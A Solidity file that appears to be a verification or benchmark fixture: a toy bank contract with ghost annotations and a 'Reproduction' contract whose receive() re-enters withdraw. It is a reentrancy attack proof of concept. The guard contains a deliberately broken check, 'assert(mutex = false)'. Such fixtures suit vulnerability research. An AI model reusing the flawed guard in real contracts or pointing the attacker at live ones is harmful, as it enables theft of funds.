// SPDX-License-Identifier: GPL-3.0
pragma solidity >=0.5.0;
contract Bank {
    bool mutex = false;
    function withdraw(uint amount) public {
        /// @custom:preghost function withdraw
        assert(mutex = false);
        uint old_contract_balance = address(this).balance;

        require(address(this).balance >= 10);
        mutex = true;
        (bool success, ) = msg.sender.call{value: 10}("");
        mutex = false;
        // mutex = false;
        /// @custom:postghost function withdraw
        uint new_contract_balance = address(this).balance;
    }
}

contract Reproduction {
    Bank public target;
    address public owner;

    constructor(address _target) {
        target = Bank(_target);
        owner = msg.sender;
    }

    function trigger(uint amount) external {
        target.withdraw(amount);
    }

    receive() external payable {
        target.withdraw(10);
    }
}



